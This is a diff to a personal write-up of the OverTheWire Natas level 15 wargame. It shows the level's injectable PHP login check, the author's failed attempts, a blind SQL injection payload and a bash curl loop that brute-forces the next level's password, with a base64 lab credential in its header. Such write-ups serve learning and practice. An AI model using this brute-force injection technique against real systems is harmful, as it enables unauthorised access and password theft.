@@ -339,3 +339,75 @@ So "get me everything from the database where the username is "" or True". One o
 
 
 
+another:
+
+```php
+<?
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas15', '<censored>');
+    mysql_select_db('natas15', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?>
+```
+
+Here a textboox just checks for the existance of the username by passing it to the query: `"SELECT * from users where username="<username"`
+
+WRONG DIRECTION:
+
+I focused too much on the later `if(array_key_exists("debug", $_GET))`. I found out you can't make a POST and GET simultaneously, but hitting submit makes a POST, so how do you pass variables into a GET? adding `?debug=1` to the URL didn't cut it. Instead opening dev tools and adding to the form tag `action="?debug=1`. I was hoping there would be something deeper. I also tried to do some php injection by doing something like `natas16" ; echo $ref; "` my hope with this is that the result would put the following code "SELECT * from users where username=natas16"; echo $ref;" So that the query would be sucessful, later on when res was defined (to be the results) it would show me the results. But all my attempts would just be sanitized out. I didn't figure out what to do on my own, but my friend looked up the solution hint, I caved and asked for it as well and heard it was a brute force SQL. 
+
+If the password started with an A for example, then you could put the following:
+
+`natas16" and password like "A%` --> `"SELECT * from users where username="natas16" and password like "A%"`. This would show the user exists. We actually see hinted that the password can be up to a 64 char alphanumeric (VARCHAR) string, so making a post request with a bash script works:
+
+```bash
+front=''
+for n in {1..65}
+do
+        change=0
+        echo "on round $n:"
+        for l in {a..z} {A..Z} {0..9}
+        do
+                curl -s 'http://natas15.natas.labs.overthewire.org/index.php' \
+  -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' \
+  --data-raw 'username=natas16%22++and+password+like+binary+%22'$front$l'%25' \ > output.txt
+                  if grep -q "user exists." output.txt
+                  then
+                          front+=$l # Append new successful char to beginning
+                          change=1
+                          echo "found new char: $l -- $front"
+                          break # break out of loop early
+                  fi
+        done
+        # Break when no changes to password is found
+        if [ $change == 0 ]; then echo "final -->> $front <<-- PIAZZA!"; break; fi
+done
+```
+
+(it's LIKE BINARY instead of LIKE because it makes a stronger distinguishment between capital and lower case, but details...)
